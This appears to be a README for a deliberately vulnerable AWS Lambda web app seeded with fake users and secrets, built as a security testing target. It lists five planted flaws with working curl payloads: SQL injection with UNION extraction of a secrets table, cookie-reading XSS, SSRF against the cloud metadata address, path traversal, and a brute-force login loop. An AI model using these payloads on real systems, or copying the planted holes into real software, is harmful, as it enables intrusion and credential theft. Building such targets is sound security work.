## Architecture

```
caller --> CloudFront (public) --> API Gateway HTTP API --> Lambda (src/lambda.js -> src/app.js)
                                                                  |
                                                     in-memory SQLite, seeded with fake data
                                                     (src/services/vulnerable.service.js)
```

- Stack: `cdk/lib/target-app-stack.ts` — bundles `vuln-web-app/src/lambda.js`
  with esbuild via `NodejsFunction`, fronts it with an HTTP API, fronts
  _that_ with CloudFront (caching disabled, all methods allowed, so every
  request reaches the Lambda live).

## Deploying

```
cd cdk
npm install
npx cdk deploy
```

Note the `CloudFrontUrl` output — that's `$HOST` below.

## The five weaknesses

### 1. SQL injection — `GET /api/vulnerable/users/search?email=`

`src/services/vulnerable.service.js` → `searchUsersByEmailUnsafe()` builds
a query by directly concatenating the `email` parameter into SQL text and
runs it against a real SQLite database (Node's built-in `node:sqlite`) —
no parameterization. It's the same failure mode as calling the real Neon
driver's `sql.query(rawString)` with a hand-built string instead of
placeholders.

**Auth-bypass-style payload:**

```bash
curl -s "https://$HOST/api/vulnerable/users/search" --get \
  --data-urlencode "email=' OR '1'='1"
```

Returns all four fake users instead of zero/one.

**UNION-based extraction of a table the endpoint was never meant to expose:**

```bash
curl -s "https://$HOST/api/vulnerable/users/search" --get --data-urlencode \
  "email=nonexistent' UNION SELECT id, name, value, 'x' FROM secrets --"
```

Returns fake `stripe_api_key` / `internal_admin_pw` values from the
`secrets` table.

### 2. Reflected XSS — `GET /api/vulnerable/greet?name=`

`vulnerable.controller.js` → `greet()` interpolates the `name` query
parameter directly into an HTML response with no output encoding.

```bash
curl -s "https://$HOST/api/vulnerable/greet" --get --data-urlencode \
  "name=<script>alert(document.cookie)</script>"
```

Response contains the literal, unescaped `<script>` tag. Confirm execution
by opening the same URL in a browser.

### 3. SSRF — `GET /api/vulnerable/fetch?url=`

`vulnerable.controller.js` → `fetchUrl()` fetches whatever URL the caller
supplies, server-side, with no allowlist and no check for internal /
link-local addresses.

```bash
curl -s "https://$HOST/api/vulnerable/fetch" --get --data-urlencode \
  "url=https://api.github.com/zen"
```

Response includes `upstream_status` and response headers/body pulled by
the server — proving the request was made server-side, not by the caller.

If the Lambda is later attached to a VPC, this same route can be used to
probe internal-only endpoints:

```bash
curl -s "https://$HOST/api/vulnerable/fetch" --get --data-urlencode \
  "url=http://169.254.169.254/latest/meta-data/"
```

### 4. Config exposure / path traversal — `GET /api/vulnerable/config` and `GET /api/vulnerable/files?path=`

`src/config/target-config.json` (fake DB password, fake Arcjet key, fake
JWT signing secret) is bundled with the Lambda and served with no
authentication. `getFile()` joins caller-supplied input directly onto the
config directory path with no `..` sanitization or containment check.

```bash
curl -s "https://$HOST/api/vulnerable/config"
curl -s "https://$HOST/api/vulnerable/files" --get --data-urlencode \
  "path=../../package.json"
```

Both return files an outside caller should never see.

### 5. No rate limiting — `POST /api/vulnerable/login`

The real app has actual rate limiting: `src/middleware/security.middleware.js`
applies an Arcjet `slidingWindow` rule to every route, mounted globally in
`app.js`. The vulnerable router is deliberately mounted **before** that
middleware:

```js
app.use("/api/vulnerable", vulnerableRoutes); // added
app.use(securityMiddleware); // the real rate limiter
```

so none of its routes are ever touched by the app's actual protection. On
top of that, `login()` tracks a per-email attempt counter but never
enforces anything against it — no lockout, no delay, no CAPTCHA.

```bash
for i in $(seq 1 20); do
  curl -s -o /dev/null -w "%{http_code} " \
    -X POST "https://$HOST/api/vulnerable/login" \
    -H 'content-type: application/json' \
    -d "{\"email\":\"carol@example.test\",\"password\":\"guess$i\"}"
done
echo
```

All 20 requests return promptly with no `403`/`429` and no slowdown,
confirmed by `attempts_seen_for_this_email` climbing to 20 in the response
bodies.

## Fake data reference

| email              | password            | role  |
| ------------------ | ------------------- | ----- |
| alice@example.test | CorrectHorse1!      | user  |
| bob@example.test   | Password123!        | user  |
| carol@example.test | SuperSecretAdminPW! | admin |
| dave@example.test  | letmein42           | user  |
